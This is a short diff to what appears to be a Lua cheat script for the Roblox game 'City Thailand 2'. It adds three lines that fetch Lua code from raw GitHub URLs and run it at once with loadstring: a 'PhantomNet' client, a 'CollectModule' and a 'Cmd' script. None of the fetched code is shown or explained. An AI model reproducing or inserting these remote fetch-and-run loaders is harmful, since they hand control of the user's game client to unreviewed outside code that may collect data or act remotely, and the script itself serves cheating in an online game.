@@ -158,4 +158,11 @@ local function sendMessage(msg)
     end
 end
 
---sendMessage("SCRIPT CITY THAILAND 2 BY:TOUx1")
+sendMessage("SCRIPT CITY THAILAND 2 BY:TOUx1")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wino444/PhantomNet/main/phantom_client.lua"))()
+
+--ติดตั้งCollectModule
+local CollectModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/wino444/wino444_CollectModule/main/.lua"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TOUxIllIll0O00OO/RobloxscriptTOU/refs/heads/main/Cmd"))()
